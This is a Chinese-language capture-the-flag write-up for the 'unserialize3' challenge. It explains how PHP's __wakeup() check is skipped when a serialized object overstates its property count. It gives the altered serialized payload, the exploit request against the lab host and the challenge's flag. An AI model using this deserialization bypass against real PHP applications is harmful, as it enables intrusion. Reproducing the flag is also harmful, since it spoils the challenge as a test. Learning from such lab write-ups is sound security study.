
## unserialize3

打开场景可以看到
```
class xctf{
public $flag = '111';
public function __wakeup(){
exit('bad requests');
}
?code=
```
* 代码审计，可以看到   function __wakeup()，配合题目unserialize想到PHP的序列化和反序列化
* ?code=  使用code传入payload
---
### __wakeup()函数用法:

__wakeup()是用在反序列化操作中。unserialize()会检查存在一个__wakeup()方法。如果存在，则先会调用__wakeup()方法。
```
<?php
class A{
function __wakeup(){
echo 'Hello';
}
}
$c = new A();
$d=unserialize('O:1:"A":0:{}');
?>
```
以上为示例代码 会输出 hello

---
题目中的 __wakeup() 函数如下
```
public function __wakeup(){
exit('bad requests');
}
```
调用 __wakeup() 会触发 exit('bad requests'); 所以应该绕过 __wakeup()

---
### 漏洞
__wakeup()漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。

* 执行以下代码 得到 xctf类 实例化后的对象，并输出 序列化的字符串
```
<?php
class xctf{                      //定义一个名为xctf的类
public $flag = '111';            //定义一个公有的类属性$flag，值为111
public function __wakeup(){      //定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本
exit('bad requests');
}
}
$test = new xctf();           //使用new运算符来实例化该类（xctf）的对象为test
echo(serialize($test));       //输出被序列化的对象（test）
?>
```
执行结果
```
O:4:"xctf":1:{s:4:"flag";s:3:"111";}
```
### payload
当我们将上述的序列化的字符串中的对象属性个数由真实值1修改为2
```
O:4:"xctf":2:{s:4:"flag";s:3:"111";}
```
使用 ？code=  get请求传入序列化后的字符串
```
http://111.198.29.45:30940?code=O:4:“xctf”:2:{s:4:“flag”;s:3:“111”;}
```
得到flag
```
the answer is : cyberpeace{31257a80ea7ba3411e2384dab6eaf26a}
```